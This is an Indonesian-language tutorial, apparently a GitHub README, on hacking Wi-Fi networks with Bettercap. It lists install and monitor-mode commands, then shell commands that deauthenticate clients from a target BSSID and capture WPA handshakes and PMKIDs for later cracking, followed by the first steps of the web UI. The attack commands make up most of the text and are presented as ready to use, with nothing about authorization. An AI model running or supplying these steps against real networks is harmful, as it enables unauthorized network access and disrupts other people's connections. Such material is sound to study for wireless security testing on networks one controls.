# Hack Wi-Fi Menggunakan Bettercap

## Cara Instal

### Kali Linux/Parrot OS

```
sudo apt-get udpate
sudo apt-get install bettercap bettercap-caplets
```

Cek versi:

```
bettercap -version
```

## Persiapan

Sebelum menggunakan Bettercap, kita harus mengaktifkan mode monitor pada interface dengan menjalankan perintah berikut:

```
sudo airmon-ng check kill
sudo airmon-ng start [INTERFACE]
```

## 1. Mode Interaktif (Shell Mode)


### 1. Capture Handshake

```
set wifi.interface [INTERFACE]
set wifi.handshakes.file [OUTPUT]
set wifi.handshakes.aggregate false
wifi.recon on
wifi.show
set wifi.assoc.skip [BSSID]
wifi.deauth [BSSID]
```

### 2. Capture PMKID

```
set wifi.interface [INTERFACE]
set wifi.handshakes.file [OUTPUT]
set wifi.handshakes.aggregate false
wifi.recon on
wifi.show
wifi.assoc [BSSID]
```

## 3. Web UI

1. Jalankan Bettercap dengan web UI aktif:

   ```
   sudo bettercap -caplet http-ui
   ```

2. Blok alamat URL yang terdapat pada bagian `starting on`, yaitu `http://12.0.0.1`, kemudian klik kanan dan pilih `Open Link`.
   
   ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%201.png)

3. Masukkan:
   - **Username**: `user`
   - **Password**: `pass`
  
   ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%202.png)

4. Klik icon Wi-Fi.

   ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui3.png)

5. PIlih interface yang ingin digunakan dengan mengklik menu dropdown sepertin yang ada di gambar ini:

   ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/%20ui%204.png)

6. Lakukan pemindaian (scanning) Wi-Fi dengan mengklik ikon seperti yang ditunjukkan pada gambar ini:

   ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%205.png)
